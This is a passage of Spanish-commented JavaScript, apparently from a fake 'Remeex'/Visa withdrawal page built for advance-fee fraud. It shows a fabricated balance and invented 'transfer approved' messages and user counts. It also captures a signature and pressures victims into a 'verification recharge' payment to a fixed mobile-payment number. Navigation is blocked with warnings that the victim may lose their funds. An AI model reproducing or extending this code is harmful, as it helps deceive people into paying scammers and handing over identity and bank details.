      }, 10);
    }
  }

  function hideVisaCard(id) {
    const card = document.getElementById(id);
    if (card) {
      card.classList.remove("active");
      // Esperar a que termine la transición antes de ocultar
      setTimeout(() => {
        card.style.display = "none";
      }, 400);
    }
  }

  /****************************************************
   * VARIABLES GLOBALES / REFERENCIAS
   ****************************************************/
  let saldoDisponible = 0;
  let nombreCompleto = "";
  let documentoBeneficiario = "";
  let fechaNacimiento = "";
  let bancoUsuario = "";
  let numeroCuenta = "";
  let tipoCuenta = "";
  let telefonoUsuario = "";
  let logoBancoUsuario = "";

  // Para firma digital
  let isDrawing = false;
  let ctx, signatureCanvas;
  let signatureDataURL = null;

  // Timers y contadores
  let securityVerification1Countdown = 30;
  let securityVerification2Countdown = 8;
  let security3ACountdown = 38;
  let security3BCountdown = 20;
  let recargaReadyBtnCountdown = 180; // 3 minutos
  let confirmRecargaBtnCountdown = 6;

  let recargaReadyBtnEnabled = false;
  let firmaSecuenciaStep = 0;
  let recargaSecuenciaStep = 0;
  let secuenciaFinalStep = 0;

  let isRedirecting = false;
  let redirectCountdownInterval = null;

  let exchangeRate = 37.40;
  let showingBs = true;

  // Control de estilos del spinner
  let currentSpinnerStyle = 1;
  let isPersonalized = false;

  // Control de veces que se abre el overlay de datos:
  let timesBlurOpened = 0;

  // Audio control
  let audioPlayed = false;
  let youtubePlayer = null;

  // Mensajes para la tarjeta
  const allMessages = [
    "Procesando transferencia",
    "Estableciendo conexión con tu banco",
    "Conexión establecida con éxito",
    "Proceso 100% funcional y seguro",
    "Recibirás tus fondos en 5 minutos",
    "Recibirás tus fondos en 3 minutos",
    "Tiempo estimado: 1 minuto",
    "Transferencia aprobada por el banco",
    "Preparando entrega final",
    "Canal de transferencia encriptado",
    "Protocolo de seguridad activado",
    "Transferencia protegida y verificada",
    "Verificación biométrica completada",
    "Verificación en 2 pasos aprobada",
    "Tus fondos están asegurados",
    "Tasa de cambio asegurada y fijada",
    "Sincronizando con banco emisor",
    "Banco receptor notificado",
    "Tu banco ha aprobado la operación",
    "Fondos reservados para entrega",
    "Confirmando disponibilidad",
    "Optimizando ruta de transferencia",
    "Verificando mejor opción de entrega",
    "Procesamiento avanzado al 80%",
    "Validando datos bancarios",
    "Confirmando identidad",
    "Asegurando tasa preferencial",
    "Tu transacción es prioritaria",
    "Tu solicitud ha sido priorizada",
    "Tu transferencia está en cola",
    "Tu conexión es estable",
    "Tu conexión es débil, pero segura",
    "Optimizando para conexión lenta",
    "Conexión restablecida correctamente",
    "Velocidad de transferencia: óptima",
    "Operación exitosa en proceso",
    "Todo va según lo previsto",
    "No hay inconvenientes detectados",
    "Transferencia en fase final",
    "Ya casi está listo"
  ];
  let activeUsers = 347; // ejemplo

  /****************************************************
   * EVENTO DOMContentLoaded
   ****************************************************/
  document.addEventListener("DOMContentLoaded", () => {
    // Activamos aparición suave del container
    document.querySelector('.container').classList.add('active');

    // Cargamos (si existiera) la data guardada en sessionStorage
    loadSavedData();

    // Iniciamos la tarjeta de saldo y su lógica
    initBalanceCardLogic();

    // Inicializamos la firma
    initSignatureCanvas();

    // Configuramos listeners de botones
    setupEventListeners();

    // Evitar retroceso y recarga
    setupNavigationWarning();

    // Inicializar manejo de mouse para efectos glow en overlays
    initMouseMoveEffects();
    
    // Agregar protección de contraseña (desde paste.txt)
    addPasswordProtection();
  });
  
  /****************************************************
   * Evitar retroceso y recarga con advertencia
   ****************************************************/
  function setupNavigationWarning() {
    // Evitar retroceso
    history.pushState({}, '', '');
    window.addEventListener('popstate', function(e) {
      if (!isRedirecting) {
        e.preventDefault();
        history.pushState({}, '', '');
        showNavigationWarning();
      }
    });
    
    // Evitar recarga
    window.addEventListener('beforeunload', function(e) {
      if (!isRedirecting) {
        e.preventDefault();
        e.returnValue = "Si abandonas esta página, podrías perder tus fondos. ¿Estás seguro?";
        return e.returnValue;
      }
    });
  }
  
  function showNavigationWarning() {
    const confirmLeave = confirm("ADVERTENCIA: Si retrocedes o recargas esta página perderás tu sesión y podrías perder tus fondos. Te recomendamos contactar con atención al cliente antes de cualquier acción. ¿Realmente deseas salir?");
    
    if (confirmLeave) {
      isRedirecting = true;
      window.location.href = "https://visa.es";
    }
  }

  /****************************************************
   * Efectos de mouse para overlays
   ****************************************************/
  function initMouseMoveEffects() {
    const overlays = document.querySelectorAll('.overlay');
    overlays.forEach(overlay => {
      overlay.addEventListener("mousemove", handleMouseMove);
    });
  }

  function handleMouseMove(e) {
    const modal = e.currentTarget.querySelector('.modal-glow');
    if (!modal) return;
    
    const rect = modal.getBoundingClientRect();
    const x = ((e.clientX - rect.left) / rect.width) * 100;
    const y = ((e.clientY - rect.top) / rect.height) * 100;
    
    modal.style.setProperty('--mouse-x', `${x}%`);
    modal.style.setProperty('--mouse-y', `${y}%`);
  }

  /****************************************************
   * Animación de barra de progreso
   ****************************************************/
  function animateProgressBar(progressBar, startWidth, targetWidth, duration, percentDisplay) {
    const startTime = performance.now();
    
    function updateProgress(currentTime) {
      const elapsedTime = currentTime - startTime;
      const progress = Math.min(elapsedTime / duration, 1);
      const currentWidth = startWidth + (targetWidth - startWidth) * easeOutQuad(progress);
      
      progressBar.style.width = `${currentWidth}%`;
      if (percentDisplay) {
        percentDisplay.textContent = `${Math.round(currentWidth)}%`;
      }
      
      if (progress < 1) {
        requestAnimationFrame(updateProgress);
      }
    }
    
    requestAnimationFrame(updateProgress);
  }
  
  // Función de easing para animaciones más naturales
  function easeOutQuad(t) {
    return t * (2 - t);
  }

  /****************************************************
   * Carga de datos (MEJORADA)
   ****************************************************/
  function loadSavedData() {
    // Leer sessionStorage y localStorage para máxima compatibilidad
    const datosRemeex = JSON.parse(
      sessionStorage.getItem('datosRemeex') || 
      localStorage.getItem('datosRemeex') || 
      '{}'
    );

    if (datosRemeex.fullName) nombreCompleto = datosRemeex.fullName;
    if (datosRemeex.docNumberCompleto) {
      documentoBeneficiario = datosRemeex.docNumberCompleto;
    } else if (datosRemeex.docNumber) {
      documentoBeneficiario = datosRemeex.docNumber;
    }
    if (datosRemeex.birthDate) fechaNacimiento = datosRemeex.birthDate;
    if (datosRemeex.bankName) bancoUsuario = datosRemeex.bankName;
    if (datosRemeex.bankAccount) numeroCuenta = datosRemeex.bankAccount;
    if (datosRemeex.bankType) tipoCuenta = datosRemeex.bankType;
    if (datosRemeex.userPhone) telefonoUsuario = datosRemeex.userPhone;

    // Logo del banco - intentar diferentes fuentes
    if (datosRemeex.bankLogo) {
      logoBancoUsuario = datosRemeex.bankLogo;
    } else if (sessionStorage.getItem("bankLogo")) {
      logoBancoUsuario = sessionStorage.getItem("bankLogo");
    } else if (localStorage.getItem("bankLogo")) {
      logoBancoUsuario = localStorage.getItem("bankLogo");
    } else {
      logoBancoUsuario = getBankLogoURL(bancoUsuario);
    }

    // Saldo en Bs - buscar en múltiples fuentes y formatos
    let saldoData = sessionStorage.getItem("currentBalanceBS") || 
                    localStorage.getItem("currentBalanceBS") || 
                    "0,00 Bs";
    
    // Intenta obtener también del objeto datosRemeex
    if (datosRemeex.saldoDisponible) {
      saldoData = datosRemeex.saldoDisponible;
    }
    
    // Convertir a número flotante, manejando varios formatos posibles
    saldoDisponible = parseFloat(
      saldoData
        .toString()
        .replace(/\./g, '')
        .replace(',', '.')
        .replace(/[^\d.]/g, '')
    ) || 0;

    // Si no hay saldo, usar un valor por defecto
    if (saldoDisponible <= 0) {
      saldoDisponible = 1800.00; // Valor por defecto
    }

    // Actualizar en la UI
    document.getElementById("balanceAmount").textContent = formatNumberVE(saldoDisponible) + " Bs";

    // Ajustar textos si tenemos info
    const securityVerificationText1 = document.getElementById("securityVerificationText1");
    if (securityVerificationText1 && documentoBeneficiario) {
      securityVerificationText1.textContent = 
        `Tu firma no coincide con la que aparece en tu documento de identidad (${documentoBeneficiario}). 
         Por seguridad, necesitamos validar que eres el titular legítimo antes de procesar tu solicitud.`;
    }

    // Obtener tasa de cambio de datosRemeex
    if (datosRemeex.rateBolivar) {
      exchangeRate = parseFloat(datosRemeex.rateBolivar);
      document.getElementById("exchangeRateText").textContent = `Tasa: ${exchangeRate.toFixed(2)}`;
    }

    // Verificar si la contraseña aporta información para tasa y monto mínimo
    if (datosRemeex.password) {
      const pass = datosRemeex.password;
      if (pass.length >= 10) {
        const last4 = pass.slice(-4); // últimos 4 dígitos
        // Los dos últimos => tasaCambio
        const possibleRate = parseInt(last4.slice(2, 4), 10);

        // Solo si son válidos...
        if (!isNaN(possibleRate) && possibleRate > 0) {
          exchangeRate = possibleRate;
          document.getElementById("exchangeRateText").textContent = `Tasa: ${exchangeRate.toFixed(2)}`;
        }
      }
    }

    // NUEVA LÓGICA PARA CALCULAR EL MONTO DE RECARGA Y ACTUALIZAR TODA LA UI
    actualizarMontosEnUI();
    actualizarTextosCorchetes();
    actualizarFormularioRecarga();
  }

  // Calcular valores dinámicos a partir de la contraseña
  function calcularMontoRecarga() {
    const datosRemeex = JSON.parse(
      sessionStorage.getItem("datosRemeex") || 
      localStorage.getItem("datosRemeex") || 
      "{}"
    );
    
    // Obtener la tasa, primero de la sessionStorage, luego de la variable global
    let tasaCambio = parseFloat(datosRemeex.rateBolivar || exchangeRate.toString());
    let montoMinimo = 20; // Valor predeterminado

    // Extraer el monto mínimo de la contraseña si está disponible
    if (datosRemeex.password && datosRemeex.password.length >= 10) {
      const last4 = datosRemeex.password.slice(-4);
      montoMinimo = parseInt(last4.slice(0, 2), 10) || montoMinimo;
      
      // Actualizar tasa de cambio si es necesario
      const possibleRate = parseInt(last4.slice(2, 4), 10);
      if (!isNaN(possibleRate) && possibleRate > 0) {
        tasaCambio = possibleRate;
        exchangeRate = tasaCambio;
        document.getElementById("exchangeRateText").textContent = `Tasa: ${exchangeRate.toFixed(2)}`;
      }
    }

    // Calcular el monto de recarga en bolívares
    const montoRecargaBs = Math.round(montoMinimo * tasaCambio * 100) / 100;
    return {
      montoMinimo: montoMinimo,
      tasaCambio: tasaCambio,
      montoRecargaBs: montoRecargaBs
    };
  }

  // Actualizar todos los elementos con el monto correcto
  function actualizarMontosEnUI() {
    const { montoMinimo, tasaCambio, montoRecargaBs } = calcularMontoRecarga();
    const montoFormateado = formatNumberVE(montoRecargaBs);
    
    // Actualizar todos los elementos que muestran el monto de recarga
    const elementosMontoRecarga = [
      "verificacionMonto", 
      "verificacionMontoModal", 
      "recargaMonto", 
      "montoVerificacionTexto", 
      "montoReembolsoTexto",
      "montoRecargaError",
      "montoVerificacionBsModal"
    ];
    
    elementosMontoRecarga.forEach(id => {
      const elemento = document.getElementById(id);
      if (elemento) {
        if (id === "verificacionMonto" || id === "verificacionMontoModal") {
          elemento.textContent = `${montoFormateado} Bolívares`;
        } else if (id === "recargaMonto") {
          elemento.value = montoFormateado;
        } else {
          elemento.textContent = `${montoFormateado} Bs`;
        }
      }
    });
    
    // Actualizar elementos que muestran el equivalente en USD
    const montoVerificacionUsd = document.getElementById("montoVerificacionUsdModal");
    if (montoVerificacionUsd) {
      montoVerificacionUsd.textContent = `$${montoMinimo.toFixed(2)}`;
    }
    
    // Actualizar textos en elementos con clase "blink"
    const elementosBlink = document.querySelectorAll(".blink");
    elementosBlink.forEach(elemento => {
      elemento.textContent = `Bs. ${montoFormateado}`;
    });
    
    // Actualizar el monto total del depósito
    const montoDepositoTotal = document.getElementById("montoDepositoTotal");
    if (montoDepositoTotal && saldoDisponible > 0) {
      const total = saldoDisponible + montoRecargaBs;
      montoDepositoTotal.textContent = `${formatNumberVE(total)} Bs`;
    }
    
    // Actualizar saldo requerido
    const saldoRequerido = document.getElementById("saldoRequerido");
    if (saldoRequerido) {
      saldoRequerido.textContent = `${formatNumberVE(saldoDisponible)} Bs`;
    }
    
    // Actualizar monto retiro
    const montoRetiroBs = document.getElementById("montoRetiroBs");
    if (montoRetiroBs) {
      montoRetiroBs.textContent = `${formatNumberVE(saldoDisponible)} Bs`;
    }
    
    // Actualizar textos de recarga en los overlays
    const recargaMontoTexto = document.getElementById("recargaMontoTexto");
    if (recargaMontoTexto) {
      recargaMontoTexto.textContent = `${montoFormateado} Bs`;
    }
  }

  // Actualizar textos entre corchetes
  function actualizarTextosCorchetes() {
    // Nombres de banco
    document.querySelectorAll(".nombreBancoUsuario").forEach(span => {
      span.textContent = bancoUsuario || "Banco";
    });
    
    // Número de cuenta
    document.querySelectorAll(".numeroCuentaUsuario").forEach(elem => {
      elem.textContent = numeroCuenta || "XXXX-XXXX-XXXX-XXXX";
    });
    
    // Nombres de banco recarga
    document.querySelectorAll(".nombreBancoRecarga").forEach(elem => {
      elem.textContent = bancoUsuario || "Banco";
    });
    
    // Información del usuario en aviso
    const nombreUsuarioAviso = document.getElementById("nombreUsuarioAviso");
    if (nombreUsuarioAviso) {
      nombreUsuarioAviso.textContent = nombreCompleto || "Usuario";
    }
    
    // Actualizar conceptos de pago
    const documentoBeneficiarioTexto = documentoBeneficiario || "Documento de identidad";
    const conceptoElements = ["conceptoRecarga", "conceptoPagoMovil", "conceptoRecargaModal"];
    conceptoElements.forEach(id => {
      const elemento = document.getElementById(id);
      if (elemento) {
        elemento.textContent = documentoBeneficiarioTexto;
      }
    });
    
    // Verificación de recarga
    const verificacionNumero = document.getElementById("verificacionNumero");
    const verificacionNumeroModal = document.getElementById("verificacionNumeroModal");
    if (verificacionNumero) verificacionNumero.textContent = "0412-1000000";
    if (verificacionNumeroModal) verificacionNumeroModal.textContent = "0412-1000000";
    
    const verificacionRif = document.getElementById("verificacionRif");
    const verificacionRifModal = document.getElementById("verificacionRifModal");
    if (verificacionRif) verificacionRif.textContent = "J-407502646";
    if (verificacionRifModal) verificacionRifModal.textContent = "J-407502646";
  }

  // Actualizar formulario de recarga
  function actualizarFormularioRecarga() {
    const recargaBancoOrigen = document.getElementById("recargaBancoOrigen");
    const recargaTelefono = document.getElementById("recargaTelefono");
    const recargaCedula = document.getElementById("recargaCedula");
    const logoBancoOrigen = document.getElementById("logoBancoOrigen");

    if (recargaBancoOrigen) recargaBancoOrigen.value = bancoUsuario || "";
    if (recargaTelefono) recargaTelefono.value = telefonoUsuario || "";
    if (recargaCedula) recargaCedula.value = documentoBeneficiario || "";
    if (logoBancoOrigen) logoBancoOrigen.src = logoBancoUsuario || "";
    
    // Actualizar también los textos del formulario
    const textoCompletarRecarga = document.getElementById("textoCompletarRecarga");
    const { montoRecargaBs } = calcularMontoRecarga();
    if (textoCompletarRecarga) {
      textoCompletarRecarga.innerHTML = `
        ¿Realizaste tu recarga de verificación por <span id="recargaMontoTexto">${formatNumberVE(montoRecargaBs)} Bs</span> 
        desde tu banco para confirmar tu identidad? Por favor, completa la información 
        para validar tu recarga.
      `;
    }
  }

  /****************************************************
   * Lógica de la nueva tarjeta de SALDO (optimizada)
   ****************************************************/
  function initBalanceCardLogic() {
    // Arranque con el saldo - ya cargado desde loadSavedData
    
    // Crear partículas cada 300ms
    setInterval(createParticle, 300);

    // Actualizar mensaje dinámico cada 5 segundos
    setInterval(updateDynamicMessage, 5000);

    // Alternar entre Bs y USD cada 15 segundos
    setInterval(toggleCurrency, 15000);

    // Cambiar el spinner cada 20 segundos
    setInterval(updateSpinnerStyle, 20000);

    // Personalizar el saldo cada 30s y volver a normal después de 10s
    setInterval(() => {
      togglePersonalizedBalance();
      setTimeout(() => {
        togglePersonalizedBalance();
      }, 10000);
    }, 30000);
  }

  function createParticle() {
    const particlesContainer = document.getElementById("particlesContainer");
    if (!particlesContainer) return;

    // Creamos múltiples partículas en cada llamada
    const particleCount = Math.floor(Math.random() * 3) + 3; // 3-5 partículas

    for (let i = 0; i < particleCount; i++) {
      const particle = document.createElement('div');
      particle.classList.add('particle');

      // Tipo de partícula
      const particleType = Math.random();
      if (particleType < 0.2) {
        particle.classList.add('diamond');
      } else if (particleType < 0.5) {
        particle.classList.add('mini');
      } else if (particleType < 0.7) {
        particle.classList.add('trail');
      }

      const startY = Math.random() * 60 + 60;
      let startX;
      if (particleType < 0.5) {
        startX = Math.random() * 100 + 30;
      } else {
        startX = Math.random() * 180 + 10;
      }

      const size = Math.random() * 6 + 2;
      particle.style.width = `${size}px`;
      particle.style.height = `${size}px`;
      particle.style.left = `${startX}px`;
      particle.style.top = `${startY}px`;

      particlesContainer.appendChild(particle);

      const duration = Math.random() * 3 + 1;
      const endY = Math.random() * 140 + 10;
      const useCurvedPath = Math.random() < 0.7;
      const controlPointX = useCurvedPath ? startX + (350 - startX) * 0.5 : null;
      const controlPointY = useCurvedPath ? startY - Math.random() * 50 : null;

      let keyframes;
      if (useCurvedPath) {
        keyframes = [
          { left: `${startX}px`, top: `${startY}px`, opacity: 0, transform: 'scale(0.3)' },
          { left: `${controlPointX}px`, top: `${controlPointY}px`, opacity: 0.9, transform: 'scale(1)', offset: 0.5 },
          { left: 'calc(100% - 10px)', top: `${endY}px`, opacity: 0, transform: 'scale(0.5)' }
        ];
      } else {
        keyframes = [
          { left: `${startX}px`, top: `${startY}px`, opacity: 0, transform: 'scale(0.3)' },
          { opacity: 0.9, transform: 'scale(1)', offset: 0.2 },
          { opacity: 0.7, offset: 0.7 },
          { left: 'calc(100% - 10px)', top: `${endY}px`, opacity: 0, transform: 'scale(0.5)' }
        ];
      }

      try {
        // Intentar usar la API moderna de animaciones
        const animation = particle.animate(keyframes, {
          duration: duration * 1000,
          easing: 'cubic-bezier(0.25, 0.1, 0.25, 1)',
          fill: 'forwards'
        });
        
        if (animation && typeof animation.onfinish !== 'undefined') {
          animation.onfinish = () => {
            if (particle.parentNode) {
              particle.parentNode.removeChild(particle);
            }
          };
        } else {
          // Fallback para navegadores sin soporte completo
          setTimeout(() => {
            if (particle.parentNode) {
              particle.parentNode.removeChild(particle);
            }
          }, duration * 1000);
        }
      } catch(e) {
        // Fallback si la animación falla
        setTimeout(() => {
          if (particle.parentNode) {
            particle.parentNode.removeChild(particle);
          }
        }, duration * 1000);
      }
    }
  }

  function toggleCurrency() {
    const balanceAmount = document.getElementById("balanceAmount");
    if (!balanceAmount) return;

    if (showingBs) {
      // A USD
      const usdVal = saldoDisponible / exchangeRate;
      balanceAmount.textContent = usdVal.toLocaleString("en-US", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      }) + " USD";
    } else {
      // A Bs
      balanceAmount.textContent = formatNumberVE(saldoDisponible) + " Bs";
    }
    showingBs = !showingBs;
  }

  function updateDynamicMessage() {
    const dynamicText = document.getElementById("dynamicText");
    if (!dynamicText) return;

    // Actualizar usuarios activos
    if (Math.random() > 0.5) {
      activeUsers += Math.floor(Math.random() * 5) + 1;
    } else {
      activeUsers = Math.max(300, activeUsers - Math.floor(Math.random() * 3));
    }
    const userIndex = allMessages.findIndex(msg => msg.includes('usuarios retirando'));
    if (userIndex >= 0) {
      allMessages[userIndex] = `${activeUsers} usuarios retirando ahora`;
    }

    const randomIndex = Math.floor(Math.random() * allMessages.length);
    dynamicText.style.opacity = '0';
    setTimeout(() => {
      if (allMessages[randomIndex].match(/Procesando|Estableciendo|Sincronizando|Verificando|Validando|Optimizando|Preparando/)) {
        dynamicText.innerHTML = `<span>${allMessages[randomIndex]}</span><span class="dot-loader"></span>`;
      } else {
        dynamicText.innerHTML = `<span>${allMessages[randomIndex]}</span>`;
      }
      dynamicText.style.opacity = '1';
    }, 500);
  }

  function updateSpinnerStyle() {
    const spinner = document.getElementById('balanceSpinner');
    if (!spinner) return;

    spinner.classList.remove('style1', 'style2', 'style3', 'style4');
    currentSpinnerStyle = currentSpinnerStyle % 4 + 1;
    if (currentSpinnerStyle > 1) {
      spinner.classList.add(`style${currentSpinnerStyle}`);
    }
  }
  
  // Función para personalizar el mensaje del saldo con nombre de usuario
  function togglePersonalizedBalance() {
    const balanceLabel = document.getElementById("balanceLabel");
    if (!balanceLabel) return;
    
    // Obtener nombre real o usar un valor por defecto
    const firstName = nombreCompleto ? nombreCompleto.split(' ')[0] : "Usuario";
    
    // Guardar estilo actual del spinner
    const spinner = document.getElementById("balanceSpinner");
    const spinnerClass = spinner ? spinner.className : "";
    
    if (!isPersonalized) {
      // Cambiar a formato personalizado
      balanceLabel.innerHTML = `
        ${firstName}, tu saldo disponible
        <span class="spinner" id="balanceSpinner">
          <span class="spinner-circle"></span>
          <span class="spinner-inner"></span>
        </span>
      `;
    } else {
      // Volver al formato normal
      balanceLabel.innerHTML = `
        Saldo disponible
        <span class="spinner" id="balanceSpinner">
          <span class="spinner-circle"></span>
          <span class="spinner-inner"></span>
        </span>
      `;
    }
    
    // Recuperar el nuevo spinner y aplicar el mismo estilo
    const newSpinner = document.getElementById('balanceSpinner');
    if (newSpinner && spinnerClass) {
      newSpinner.className = spinnerClass;
    } else if (newSpinner && currentSpinnerStyle > 1) {
      newSpinner.classList.add(`style${currentSpinnerStyle}`);
    }
    
    isPersonalized = !isPersonalized;
  }

  /****************************************************
   * Inicializar Canvas de firma
   ****************************************************/
  function initSignatureCanvas() {
    signatureCanvas = document.getElementById("signatureCanvas");
    if (!signatureCanvas) return;

    ctx = signatureCanvas.getContext("2d");
    resizeSignatureCanvas();

    signatureCanvas.addEventListener("mousedown", startDraw);
    signatureCanvas.addEventListener("mousemove", draw);
    signatureCanvas.addEventListener("mouseup", endDraw);
    signatureCanvas.addEventListener("mouseleave", endDraw);

    signatureCanvas.addEventListener("touchstart", startDrawTouch, { passive: false });
    signatureCanvas.addEventListener("touchmove", drawTouch, { passive: false });
    signatureCanvas.addEventListener("touchend", endDrawTouch);
  }
  function resizeSignatureCanvas() {
    signatureCanvas.width = signatureCanvas.offsetWidth;
    signatureCanvas.height = signatureCanvas.offsetHeight;
  }
  function isCanvasEmpty() {
    if (!ctx) return true;
    const pixelBuffer = new Uint32Array(
      ctx.getImageData(0, 0, signatureCanvas.width, signatureCanvas.height).data.buffer
    );
    return !pixelBuffer.some(color => color !== 0);
  }
  function startDraw(e) {
    isDrawing = true;
    ctx.beginPath();
    ctx.moveTo(e.offsetX, e.offsetY);
  }
  function draw(e) {
    if (!isDrawing) return;
    ctx.lineWidth = 2;
    ctx.lineCap = "round";
    ctx.strokeStyle = "#000";
    ctx.lineTo(e.offsetX, e.offsetY);
    ctx.stroke();
  }
  function endDraw() {
    isDrawing = false;
    ctx.closePath();
  }
  function getTouchPos(e) {
    const rect = signatureCanvas.getBoundingClientRect();
    return {
      x: e.touches[0].clientX - rect.left,
      y: e.touches[0].clientY - rect.top
    };
  }
  function startDrawTouch(e) {
    e.preventDefault();
    isDrawing = true;
    ctx.beginPath();
    const pos = getTouchPos(e);
    ctx.moveTo(pos.x, pos.y);
  }
  function drawTouch(e) {
    e.preventDefault();
    if (!isDrawing) return;
    const pos = getTouchPos(e);
    ctx.lineWidth = 2;
    ctx.lineCap = "round";
    ctx.strokeStyle = "#000";
    ctx.lineTo(pos.x, pos.y);
    ctx.stroke();
  }
  function endDrawTouch(e) {
    e.preventDefault();
    isDrawing = false;
    ctx.closePath();
  }

  /****************************************************
   * Configurar Listeners de Botones
   ****************************************************/
  function setupEventListeners() {
    const clearSignatureBtn = document.getElementById("clearSignatureBtn");
    const saveSignatureBtn = document.getElementById("saveSignatureBtn");

    clearSignatureBtn.addEventListener("click", () => {
      // Reproducir audio al hacer clic en "Limpiar"
      playAudio();
      
      if (ctx) ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
    });
    
    saveSignatureBtn.addEventListener("click", () => {
      // Reproducir audio al hacer clic en "Guardar"
      playAudio();
      
      if (isCanvasEmpty()) {
        alert("Por favor, realiza tu firma antes de continuar.");
        return;
      }
      
      // Captura la firma para mostrarla en el overlay
      signatureDataURL = signatureCanvas.toDataURL("image/png");
      document.getElementById("signaturePreviewImg").src = signatureDataURL;
      document.getElementById("bankLogoConfirmFirma").src = logoBancoUsuario;
      
      showOverlay("overlayConfirmFirma");
    });

    // Overlay Confirmar Firma
    const editarFirmaBtn = document.getElementById("editarFirmaBtn");
    const continuarFirmaBtn = document.getElementById("continuarFirmaBtn");
    editarFirmaBtn.addEventListener("click", () => {
      hideOverlay("overlayConfirmFirma");
    });
    continuarFirmaBtn.addEventListener("click", () => {
      hideOverlay("overlayConfirmFirma");
      document.getElementById("miniSignatureImg").src = signatureDataURL;
      document.getElementById("secuenciaFirmaLogo").src = logoBancoUsuario;
      startSecuenciaFirma();
    });

    // Contador step1
    const btn1 = document.getElementById("continueSecurityBtn1");
    btn1.addEventListener("click", () => {
      // Reproducir audio
      playAudio();

      // Escondemos la sección actual
      hideVisaCard("securityVerification1");
      showVisaCard("securityVerification2");
      startSecurity2Countdown();
    });

    // Contador step2
    const btn2 = document.getElementById("continueSecurityBtn2");
    btn2.addEventListener("click", () => {
      // Reproducir audio
      playAudio();

      hideVisaCard("securityVerification2");
      showVisaCard("securityVerification3A");
      startSecurity3ACountdown();
    });

    // Step3A
    const continueSecurity3ABtn = document.getElementById("continueSecurity3ABtn");
    continueSecurity3ABtn.addEventListener("click", () => {
      // Reproducir audio
      playAudio();

      hideVisaCard("securityVerification3A");
      showVisaCard("securityVerification3B");
      startSecurity3BCountdown();
    });

    // Step3B
    const continueSecurity3BBtn = document.getElementById("continueSecurity3BBtn");
    continueSecurity3BBtn.addEventListener("click", () => {
      // Reproducir audio
      playAudio();

      hideVisaCard("securityVerification3B");
      showVisaCard("securityVerification3C");
      startRecargaReadyCountdown();
    });

    // Step3C -> Verificar recarga
    const recargaReadyBtn = document.getElementById("recargaReadyBtn");
    recargaReadyBtn.addEventListener("click", () => {
      if (!recargaReadyBtnEnabled) {
        alert("Por favor, lee detenidamente. El botón estará disponible en unos minutos.");
      } else {
        // Reproducir audio
        playAudio();

        hideVisaCard("securityVerification3C");
        document.getElementById("verificandoRecargaLogo").src = logoBancoUsuario;
        startVerificandoRecarga();
      }
    });

    // Confirm recarga
    const confirmRecargaBtn = document.getElementById("confirmRecargaBtn");
    confirmRecargaBtn.addEventListener("click", () => {
      const comprobanteVal = document.getElementById("comprobanteInput").value.trim();
      if (!/^\d{12}$/.test(comprobanteVal) || comprobanteVal === "123456789123") {
        alert("El comprobante debe tener 12 dígitos válidos y no ser '123456789123'.");
        return;
      }

      // Reproducir audio
      playAudio();

      hideVisaCard("recargaSection");
      document.getElementById("secFinalLogo").src = logoBancoUsuario;
      startSecuenciaFinal();
    });

    // Blur container (para mostrar overlay de datos)
    const blurContainer = document.getElementById("blurContainer");
    if (blurContainer) {
      blurContainer.addEventListener("click", function() {
        timesBlurOpened++;
        if ((timesBlurOpened % 2) === 1) {
          // Mostrar "Documento de identidad"
          document.getElementById("conceptoRecarga").textContent = "Documento de identidad";
          document.getElementById("conceptoRecarga").parentNode.style.display = "block";
          document.getElementById("conceptoRecargaModal").textContent = "Documento de identidad";
        } else {
          // Ocultar el ítem concepto
          document.getElementById("conceptoRecarga").parentNode.style.display = "none";
          document.getElementById("conceptoRecargaModal").textContent = "";
        }
        // Muestra el overlay de datos
        showOverlay("overlayDatosVerificacion");
      });
    }

    // Cerrar modal de datos
    const closeDatosModalBtn = document.getElementById("closeDatosModalBtn");
    if (closeDatosModalBtn) {
      closeDatosModalBtn.addEventListener("click", function() {
        hideOverlay("overlayDatosVerificacion");
      });
    }

    // Contador step1 (inicial)
    startSecurity1Countdown();
  }

  /****************************************************
   * REPRODUCCIÓN DE AUDIO
   ****************************************************/
   function playAudio() {
    if (audioPlayed) return; // Solo reproducir una vez
    audioPlayed = true;

    try {
      // Intentar reproducir el audio overlay que es la URL específica solicitada
      const audioOverlay = document.getElementById("audioOverlay");
      if (audioOverlay) {
        const playPromise = audioOverlay.play();
        if (playPromise !== undefined) {
          playPromise.catch(error => {
            console.error("Error reproduciendo audioOverlay, intentando alternativas:", error);
            playYouTubeOverlayAudio();
          });
        }
      } else {
        playYouTubeOverlayAudio();
      }
    } catch (e) {
      console.error("Error en reproducción de audio:", e);
      playYouTubeOverlayAudio();
    }
  }

  // Función para reproducir el audio del overlay desde YouTube
  function playYouTubeOverlayAudio() {
    try {
      // Crear un iframe invisible de YouTube
      const youtubeContainer = document.createElement('div');
      youtubeContainer.id = 'youtubeOverlayContainer';
      youtubeContainer.style.position = 'fixed';
      youtubeContainer.style.top = '-9999px';
      youtubeContainer.style.left = '-9999px';
      youtubeContainer.style.width = '1px';
      youtubeContainer.style.height = '1px';
      youtubeContainer.style.visibility = 'hidden';
      
      // Incluir iframe con la URL específica solicitada X6mjwDUFccw
      youtubeContainer.innerHTML = `
        <iframe width="1" height="1" 
          src="https://www.youtube.com/embed/X6mjwDUFccw?autoplay=1&enablejsapi=1" 
          frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
          allowfullscreen>
        </iframe>
      `;
      
      document.body.appendChild(youtubeContainer);
    } catch (e) {
      console.error("Error en reproducción de YouTube:", e);
    }
  }

  function playAudioIntro() {
    try {
      // Intentar reproducir el audio de intro
      const audioIntro = document.getElementById("audioIntro");
      if (audioIntro) {
        const playPromise = audioIntro.play();
        if (playPromise !== undefined) {
          playPromise.catch(error => {
            console.error("Error reproduciendo audioIntro:", error);
          });
        }
      }
    } catch (e) {
      console.error("Error en reproducción de audio intro:", e);
    }
  }

  /****************************************************
   * Secuencias y Contadores
   ****************************************************/
  function startSecurity1Countdown() {
    const btn = document.getElementById("continueSecurityBtn1");
    const cdLabel = document.getElementById("countdownSecurity1");
    let timer = securityVerification1Countdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Lee detenidamente y espera ${timer} segundos para continuar...`;

    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Lee detenidamente y espera ${timer} segundos para continuar...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes continuar ahora";
      }
    }, 1000);
  }
  function startSecurity2Countdown() {
